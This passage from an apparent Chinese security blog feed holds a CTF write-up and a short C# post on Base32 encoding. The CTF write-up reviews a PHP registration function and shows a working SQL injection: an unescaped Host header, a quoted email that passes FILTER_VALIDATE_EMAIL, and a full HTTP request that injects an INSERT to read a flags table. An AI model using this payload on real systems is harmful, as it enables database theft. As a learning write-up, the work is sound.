跳转至<code>cpre.php</code>，先看这份<code>PHP代码</code>。</p><p>从开始都是一些常规的全局设置。再往下看。</p><p>目标站点只有简单的登陆功能，相关代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">escape($_REQUEST); # 转义</span><br><span class="line">escape($_POST);</span><br><span class="line">escape($_GET);</span><br><span class="line"></span><br><span class="line">function escape(&amp;$arg) &#123;</span><br><span class="line">    if(is_array($arg)) &#123; # 判断$arg是否为数组</span><br><span class="line">        foreach ($arg as &amp;$value) &#123; # 遍历$arg数组。每次循环中，当前单元的值被赋给$value并且数组内部的指针向前移一步。</span><br><span class="line">            escape($value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $arg = str_replace([&quot;&apos;&quot;, &apos;\\&apos;, &apos;(&apos;, &apos;)&apos;], [&quot;‘&quot;, &apos;\\\\&apos;, &apos;（&apos;, &apos;）&apos;], $arg); # 将$arg内的单引号、小括号转换成中文符号，将反斜杠进行转义。</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arg($name, $default = null, $trim = false) &#123;</span><br><span class="line">    if (isset($_REQUEST[$name])) &#123;# 检查$_REQUEST中是否存在$name值</span><br><span class="line">        $arg = $_REQUEST[$name];</span><br><span class="line">    &#125; elseif (isset($_SERVER[$name])) &#123; # 检查$_SERVER中是否存在$name值</span><br><span class="line">        $arg = $_SERVER[$name];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $arg = $default;</span><br><span class="line">    &#125;</span><br><span class="line">    if($trim) &#123;</span><br><span class="line">        $arg = trim($arg);</span><br><span class="line">    &#125;</span><br><span class="line">return $arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在检测的<code>$name</code>值当中，<code>$_SERVER</code>很明显并没有被转义处理。或许我们能利用这一个点。</p><p>再往下看代码、来到了<code>Controller</code>类。分了<code>BaseController.php</code>和<code>MainController.php</code>，它们是继承关系。在<code>MainController.php</code>看到了三个函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">actionIndex() #主页</span><br><span class="line">actionLogin() #登陆 (正常验证)</span><br><span class="line">actionRegister() #注册</span><br></pre></td></tr></table></figure><p>看到这里我才知道是有注册功能的。下面来看看<code>actionRegister</code>的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function actionRegister()&#123;</span><br><span class="line">    if ($_POST) &#123;</span><br><span class="line">        $username = arg(&apos;username&apos;); # 检查是否存在</span><br><span class="line">        $password = arg(&apos;password&apos;);</span><br><span class="line"></span><br><span class="line">        if (empty($username) || empty($password)) &#123;  # 判断用户密码是否为空</span><br><span class="line">            $this-&gt;error(&apos;Username or password is empty.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $email = arg(&apos;email&apos;); # 检查是否存在</span><br><span class="line">        if (empty($email)) &#123; # 如果email为空，则email由输入的用户名、@及HOST组合而成</span><br><span class="line">            $email = $username . &apos;@&apos; . arg(&apos;HTTP_HOST&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; # FILTER_VALIDATE_EMAIL过滤器</span><br><span class="line">            $this-&gt;error(&apos;Email error.&apos;); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $user = new User(); # 判断用户名是否存在</span><br><span class="line">        $data = $user-&gt;query(&quot;SELECT * FROM `&#123;$user-&gt;table_name&#125;` WHERE `username` = &apos;&#123;$username&#125;&apos;&quot;);</span><br><span class="line">        if ($data) &#123; </span><br><span class="line">            $this-&gt;error(&apos;This username is exists.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ret = $user-&gt;create([ # 向users表中插入数据</span><br><span class="line">            &apos;username&apos; =&gt; $username,</span><br><span class="line">            &apos;password&apos; =&gt; md5($password),</span><br><span class="line">            &apos;email&apos; =&gt; $email</span><br><span class="line">        ]);</span><br><span class="line">        if ($ret) &#123;</span><br><span class="line">            $_SESSION[&apos;user_id&apos;] = $user-&gt;lastInsertId();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;error(&apos;Unknown error.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能利用的点就是email的组成元素(HTTP_HOST)，而<code>HTTP_HOST</code>又是由<code>arg函数</code>获取的，也就是说可以从没有被转义的<code>$_SERVER</code>着手。既然是数据库操作，那就看看是否能构造语句使之形成<code>SQL注入漏洞</code>。</p><p>先明确一点：Email由<code>用户名</code>、<code>@</code>、<code>Host</code>三者拼接而成，而<code>Host</code>可利用的点为<code>$_SERVER</code>。</p><p>但是其中有个<code>FILTER_VALIDATE_EMAIL过滤器</code>，所以首先还是得绕过这个过滤器。</p><h2 id="绕过过滤器"><a href="#绕过过滤器" class="headerlink" title="绕过过滤器"></a>绕过过滤器</h2><p>第一次见到<code>FILTER_VALIDATE_EMAIL</code>是在PHPMailer的<code>CVE-2016-10033</code>里面遇到的，当时还是用着<code>wordpress</code>博客程序。</p><p><img src="/image/P牛的红包口令/email.png" alt="email"></p><p>这样就能引入了引号，又符合过滤器的规则。那我们就传入用户名为<code>&quot;qqq</code>，Host为<code>rcoil&#39;&quot;@rcoil.me</code>进行注册。因为邮箱中包含单引号，所以必会造成<code>SQL注入</code>。</p><h2 id="构造SQL注入"><a href="#构造SQL注入" class="headerlink" title="构造SQL注入"></a>构造SQL注入</h2><p>将<code>Host</code>进行修改，结果如下：</p><p><img src="/image/P牛的红包口令/request-0.png" alt="request-0"></p><p>404错误，并不是我们想象中的情景。之前做CTF的时候有过这类型的情况，添加多一个<code>Host</code>就可以了。如图：</p><p><img src="/image/P牛的红包口令/request-1.png" alt="request-1"></p><p>既然构成了SQL注入，那就看看怎么利用了。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>在源码中有分sql备份文件，从里面能看到SQL的结构。</p><p>最后卡在了这个报错注入里面。</p><h2 id="P牛的WriteUP"><a href="#P牛的WriteUP" class="headerlink" title="P牛的WriteUP"></a>P牛的WriteUP</h2><p><a href="https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html#0x04-nginx-host" target="_blank" rel="noopener">攻击LNMP架构Web应用的几个小Tricks</a></p><p>知识点还是掌握得不够，静下心来好好学习。</p><p>看了P牛的WriteUp，才注意到<code>create</code>方法就是拼接了一个<code>INSERT</code>语句，而且报错信息也没仔细看。</p><p>现在回过头来想想，确实就是这么一回事。在插入的过程中，闭合了前段语句，再新建一个语句插入自己定义的语句，就能在可控的范围内获取自己所需要的信息。翻了翻之前的笔记。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT @@version;</span><br><span class="line">+-----------+</span><br><span class="line">| @@version |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from demo;</span><br><span class="line">+------+------+------+</span><br><span class="line">| demo | test | aoao |</span><br><span class="line">+------+------+------+</span><br><span class="line">| d    | d    | d    |</span><br><span class="line">+------+------+------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT into demo VALUES(&apos;A&apos;,&apos;A&apos;,&apos;A&apos;),(&apos;B&apos;,&apos;B&apos;,&apos;B&apos;);</span><br><span class="line">Query OK, 2 rows affected</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from demo;</span><br><span class="line">+------+------+------+</span><br><span class="line">| demo | test | aoao |</span><br><span class="line">+------+------+------+</span><br><span class="line">| d    | d    | d    |</span><br><span class="line">| A    | A    | A    |</span><br><span class="line">| B    | B    | B    |</span><br><span class="line">+------+------+------+</span><br><span class="line">4 rows in set</span><br></pre></td></tr></table></figure><p>然后我们构造一下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /main/register HTTP/1.1</span><br><span class="line">Host: 2018.mhz.pw</span><br><span class="line">Host: rcoil&apos;),(&apos;ao123&apos;,md5(121314),(select(flag)from(flags)))#&quot;@rcoil.me</span><br><span class="line">Content-Length: 34</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://2018.mhz.pw</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://2018.mhz.pw/main/register</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=bvdrraji3mjirt5noljghm8ib7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=&quot;qq&amp;email=&amp;password=aaaaa</span><br></pre></td></tr></table></figure><p>闭合了前段的<code>INSERT语句</code>，并新建了一条语句，在<code>email</code>字段将<code>flag</code>读取。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个口令红包没领成。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="https://rcoil.me/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="https://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://rcoil.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>编码转换工具 （C#入门）</title>
    <link href="https://rcoil.me/2018/01/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7/"/>
    <id>https://rcoil.me/2018/01/编码转换工具/</id>
    <published>2018-01-03T07:11:51.000Z</published>
    <updated>2018-01-03T13:35:47.978Z</updated>
    
    <content type="html"><![CDATA[<p>一直想写一些图形化工具来用。从小入手，写了个计算器，看了下代码，有点麻瓜。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">工具：编码转换工具</span><br><span class="line">编译：VS2015 C#(.NET Framework v4.0)</span><br></pre></td></tr></table></figure><p>先看一下效果图：</p><p><img src="/image/编码转换工具/2018-01-03_15-54-01.png" alt="2018-01-03_15-54-01"></p><p>其中有个bug，就是<code>ASCii</code>不归零，也不知道是怎么回事。</p><p>默认的<code>textBox</code>获取方式为<code>Encoding.Default.GetBytes(str)</code>，注意的是要使用<code>UTF8</code>，代码有些丑陋，就不贴了。</p><p>在写到<code>Base32</code>的时候，没找到现成的方法可以直接利用，所以就去了解了下、</p><p><code>Base32</code>是由<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ234567</code>组成的,由于<code>0</code>和<code>1</code>由于与字母<code>O</code>和<code>I</code>相似性而被跳过。</p><p>规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">任意给定一个二进制数据，以5个位(bit)为一组进行切分(base64以6个位(bit)为一组)</span><br><span class="line">对切分而成的每个组进行编码得到1个可见字符。</span><br></pre></td></tr></table></figure><p>演示：（以<code>rcoil</code>字符串进行编码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符rcoil取ASCII码之后，对其转换成二进制（切5补0）得到</span><br><span class="line">01110,01001,10001,10110,11110,11010,01011,01100</span><br><span class="line">计算每组二进制对应的十进制，然后参考Base32编码表，组成密文</span><br></pre></td></tr></table></figure><p><img src="/image/编码转换工具/2018-01-03_17-51-05.png" alt="2018-01-03_17-51-05"></p><p>具体的算法就是这样，有了流程就可以写代码了。</p><p>后来找了找，能找到一些别人已经写好的类。<a href="https://stackoverflow.com/questions/641361/base32-decoding" target="_blank" rel="noopener">Base32 Decoding</a>，直接利用就可以了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直想写一些图形化工具来用。从小入手，写了个计算器，看了下代码，有点麻瓜。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
</feed>
